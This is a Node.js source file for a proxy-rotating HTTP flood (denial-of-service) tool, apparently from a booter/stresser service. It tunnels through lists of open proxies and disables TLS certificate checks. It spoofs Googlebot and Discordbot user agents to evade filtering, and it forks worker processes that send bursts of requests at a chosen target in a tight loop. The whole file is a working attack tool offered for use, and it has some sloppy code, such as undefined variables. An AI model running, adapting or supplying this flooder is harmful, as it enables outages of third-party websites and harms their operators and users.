process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity; 
const net = require('net');
const fs = require('fs');
const querystring = require('querystring'); //require for post data 
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var theJar = request_2.jar();
var path = require("path");
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}
var fileName = __filename;
var file = path.basename(fileName);
try {
    var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
    var post_test = process.argv[5];
} catch (err) {
    if (err.code !== 'error') throw err;
    console.log('Error');
    console.log("node " + file + " target proxy time mode threads | stressid.club");
    process.exit();
}

var target = process.argv[2];

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

var parsed = url.parse(target);
process.setMaxListeners(15);
let browser_saves = '';

const UAs = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4676.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Googlebot/2.1 (+http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.119 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.113 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.97 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.153 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.140 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/96.0.4664.110 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.130 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/92.0.4515.119 Safari/537.36",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; http://www.google.com/bot.html) Chrome/80.0.3987.92 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.137 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/97.0.4692.71 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.108 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.120 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.83 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.140 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.95 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.112 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/91.0.4472.90 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.108 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
  "Mozilla/5.0 (compatible; Discordbot/1.0; +https://discordapp.com)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; https://discordapp.com)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)",
  "Discordbot/2.0",
  "Discordbot/2.0ompatible; Discordbot/2.0; +https://discordapp.com)",
  "iphone 6 plus;afengineurl=https://discordbotlist.com/bots/server-captcha-bot/upvote;traceId=6d5c07b8-586f-4522-a245-f9b3f059ed10",
  "DiscordBot (https://github.com/discordjs/discord.js, 12.5.3) Node.js/v14.15.1",
  "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com),gzip(gfe)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com/)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com);",
  "Mozilla/5.0 (Windows NT 5.0; Discordbot/2.0; +https://discordapp.com)",
  "Mozilla/5.0 (compatible; Discordbot/2.0; Windows 95; +https://discordapp.com)",
];


const post_recibe = "und"; //post_test.split("''")[0];

var data2 = querystring.stringify(post_recibe);

const cluster = require('cluster');
const { cpus } = require('os');

const numCPUs = cpus().length;
var threads = process.argv[6];

if (!threads) return process.exit();

if (cluster.isPrimary) {
  console.log(`Attack Start`);

  // Fork workers.
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`Attack Stop `);
  });
} else {

//for (let j = 0; j < 64; j++) {
setInterval(function() {

var aa = getRandomNumberBetween(100, proxies.length-400);

var proxy = proxies[Math.floor(Math.random() * aa)];
proxy = proxy.split(':');

var http = require('http'),
tls = require('tls');
tls.DEFAULT_ECDH_CURVE = 'auto'

const agent = new http.Agent({
keepAlive: true,      // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity, // Maximum number of sockets to allow per host. Defaults to Infinity.
 // maxFreeSockets: 256   // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

var tlsSessionStore = {};

var req = http.request({//set proxy session
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'Keep-Alive',
    'Connection': 'Keep-Alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ req.setSocketKeepAlive(true); });

req.on('connect', function (res, socket, head) {//open raw request
    tls.authorized = true;
    tls.sync = true;
    var tlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: 'TLSv1_2_method',
        honorCipherOrder: true,
        //requestCert: true,
        host: parsed.host,
        port: 80,
        secureOptions: 'SSL_OP_NO_SSLv2' | 'SSL_OP_NO_SSLv3' | 'SSL_OP_NO_COMPRESSION', //'SSL_OP_*',
        servername: parsed.host,
       //secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {
       for (let j = 0; j < 64; j++) {
    tlsConnection.setKeepAlive(true, 5000)
    tlsConnection.setTimeout(5000);

tlsConnection.write(`${process.argv[5]} `+target+' HTTP/1.1\r\nHost: '+parsed.host+'\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
}
});

    tlsConnection.on('newSession', function(id, data) {
tlsSessionStore[id] = data;
});
tlsConnection.on('resumeSession', function(id, cb) {
cb(null, tlsSessionStore[id] || null);
});

tlsConnection.on('disconnected', () => {tlsConnection.destroy();});
tlsConnection.on('timeout' , () => {tlsConnection.destroy()});
tlsConnection.on('error', (err) =>{tlsConnection.destroy()});
tlsConnection.on('data', (chunk) => { data += chunk; tlsConnection.destroy(); chunk.push(chunk);  setTimeout(function () { tlsConnection.abort(); return delete tlsConnection; }, 5000); });

    tlsConnection.on('end', () => {
      console.log(data);
      tlsConnection.abort();
      tlsConnection.destroy();
    });

}).end()
req.end()
}, 0);
}

setTimeout(() => {
  process.exit(1);
}, time)

console.log('Attack started to '+target);